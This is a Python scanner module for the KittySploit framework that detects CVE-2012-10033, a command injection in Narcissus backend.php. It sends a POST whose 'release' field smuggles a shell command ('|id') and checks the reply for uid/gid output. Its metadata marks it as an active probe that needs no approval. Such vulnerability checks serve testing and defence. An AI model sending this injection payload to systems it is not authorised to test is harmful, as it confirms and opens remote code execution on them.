#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Narcissus backend.php command injection (CVE-2012-10033)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Narcissus - backend.php RCE Detection (CVE-2012-10033)',
        'description': (
            'Detects CVE-2012-10033 by POSTing '
            'machine=0&action=configure_image&release=|id to backend.php.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2012', 'narcissus', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2012-10033',
        ],
        'cve': 'CVE-2012-10033',
    }

    def run(self):
        data = 'machine=0&action=configure_image&release=|id'
        for base in ('', '/narcissus'):
            r = self.http_request(
                method='POST',
                path=f'{base}/backend.php',
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='Narcissus backend.php RCE (CVE-2012-10033)',
                    path=f'{base}/backend.php',
                )
                return True
        return False
